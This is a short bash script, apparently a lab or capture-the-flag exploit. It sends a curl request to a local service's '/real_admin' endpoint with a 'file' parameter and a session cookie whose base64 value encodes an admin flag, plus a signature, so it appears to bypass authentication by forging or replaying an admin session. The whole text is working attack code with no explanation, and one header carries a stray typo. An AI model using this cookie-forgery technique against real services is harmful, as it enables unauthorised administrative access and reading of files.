#!/bin/bash

curl --request GET \
  --url 'http://localhost:39993/real_admin?file=file' \
  --header 'content-type: application/x-www-form-urlencodedC' \
  --header 'cookie: session=eyJhZG1pbiI6dHJ1ZX0=; session.sig=_xVjCLdo74nT98RCUcPQ3zCBkNQ;' \
  --cookie 'session=eyJhZG1pbiI6dHJ1ZX0=; session.sig=_xVjCLdo74nT98RCUcPQ3zCBkNQ;'
